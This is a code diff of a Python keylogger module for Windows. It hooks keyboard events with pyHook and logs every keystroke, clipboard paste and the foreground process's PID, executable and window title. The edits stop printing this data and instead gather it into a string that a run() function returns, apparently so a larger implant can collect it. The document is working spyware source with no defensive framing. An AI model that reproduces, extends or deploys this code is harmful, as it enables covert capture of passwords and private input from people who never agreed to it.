@@ -11,10 +11,10 @@ psapi    = windll.psapi
 current_window = None
 
 num = 1
-s = "string:"
+s = ""
 
 def get_current_process():
-
+    global s
     # get a handle to the foreground window
     hwnd = user32.GetForegroundWindow()
 
@@ -36,7 +36,7 @@ def get_current_process():
     length = user32.GetWindowTextA(hwnd, byref(window_title),512)
 
     # print out the header if we're in the right process
-    #Test2.s = Test2.s + "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
+    s = s + "\n[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value) + "\n"
 
     # close handles
     kernel32.CloseHandle(hwnd)
@@ -64,9 +64,9 @@ def KeyStroke(event):
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
-            print ("[PASTE] - %s" % (pasted_value)),
+            s = s + "[PASTE] - %s" % (pasted_value)
         else:
-            print ("[%s]" % event.Key),
+            s = s + "[%s]" % event.Key
 
 			
     # pass execution to next hook registered 
@@ -74,11 +74,11 @@ def KeyStroke(event):
 def run(**args):
     global s
     global num
-    print "called run"
     kl         = pyHook.HookManager()
     kl.KeyDown = KeyStroke
     kl.HookKeyboard()
-    while num < 10:
+    while num < 100:
+        time.sleep(0.05)
         pythoncom.PumpWaitingMessages()
     return s
 	
